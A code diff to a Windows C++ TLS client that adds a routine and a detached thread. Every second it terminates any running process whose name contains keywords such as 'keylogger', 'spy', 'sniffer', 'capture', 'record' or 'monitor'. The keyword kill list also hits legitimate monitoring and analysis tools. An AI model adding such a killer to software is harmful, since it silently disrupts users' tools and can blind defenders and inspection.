@@ -11,6 +11,9 @@
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <windows.h>
+#include <tlhelp32.h>
+#include <algorithm>
+#include <chrono>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "user32.lib")
@@ -101,7 +104,50 @@ void signal_handler(int) {
     exit(0);
 }
 
+void KillSuspiciousProcesses() {
+    const std::vector<std::wstring> suspicious_keywords = {
+        L"keylogger", L"logger", L"spy", L"hook", L"capture", L"sniffer", L"record", L"monitor"
+    };
+
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+
+    PROCESSENTRY32W pe;
+    pe.dwSize = sizeof(pe);
+
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            std::wstring procName = pe.szExeFile;
+            std::wstring lowerProcName = procName;
+            std::transform(lowerProcName.begin(), lowerProcName.end(), lowerProcName.begin(), ::towlower);
+
+            for (const auto& keyword : suspicious_keywords) {
+                if (lowerProcName.find(keyword) != std::wstring::npos) {
+                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if (hProc) {
+                        TerminateProcess(hProc, 0);
+                        CloseHandle(hProc);
+                    }
+                    break;
+                }
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+}
+
+void StartSuspiciousProcessMonitor() {
+    std::thread([]() {
+        while (true) {
+            KillSuspiciousProcesses();
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        }
+    }).detach();
+}
+
 int main(int argc, char* argv[]) {
+    KillSuspiciousProcesses();
+    StartSuspiciousProcessMonitor();
     // OpenSSL initialization
     SSL_library_init();
     SSL_load_error_strings();
